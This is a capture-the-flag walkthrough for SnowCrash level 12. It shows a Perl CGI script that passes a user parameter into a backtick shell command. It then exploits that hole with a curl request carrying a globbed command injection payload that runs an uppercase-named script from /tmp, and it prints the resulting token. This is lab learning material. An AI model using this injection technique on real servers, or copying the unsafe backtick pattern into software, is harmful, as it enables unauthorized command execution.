# Level12

## Enumerate

   

    level12@SnowCrash:~$ ls
	level12.pl
	level12@SnowCrash:~$ cat level12.pl
	#!/usr/bin/env perl
	# localhost:4646
	use CGI qw{param};
	print "Content-type: text/html\n\n";

	sub t {
	  $nn = $_[1];
	  $xx = $_[0];
	  $xx =~ tr/a-z/A-Z/;
	  $xx =~ s/\s.*//;
	  @output = `egrep "^$xx" /tmp/xd 2>&1`;
	  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
	  }
	  return 0;
	}

	sub n {
	  if($_[0] == 1) {
      print("..");
	  } else {
      print(".");
	  }
	}

	n(t(param("x"), param("y")));
There is a server running on localhost 4646, and each argument is capsized and standard output has been rewritten by Stderror

## Injection

Only a script with capsized name can be used since everything is getting capsized.
Let's make one:

    level12@SnowCrash:~$ mkdir /tmp/etc
	level12@SnowCrash:~$ echo "getflag > tmp/etc/flag" > /tmp/FLAG
	level12@SnowCrash:~$ chmod +x /tmp/FLAG
	level12@SnowCrash:~$ curl localhost:4646/level12.pl?x='`/*/FLAG`'
	..level12@SnowCrash:~$ cat /tmp/etc/flag
	cat: /tmp/etc/flag: No such file or directory
	level12@SnowCrash:~$ echo "getflag > /tmp/etc/flag" > /tmp/FLAG
	level12@SnowCrash:~$ chmod +x /tmp/FLAG
	level12@SnowCrash:~$ curl localhost:4646/level12.pl?x='`/*/FLAG`'
	..level12@SnowCrash:~cat /tmp/etc/flag`'
	Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
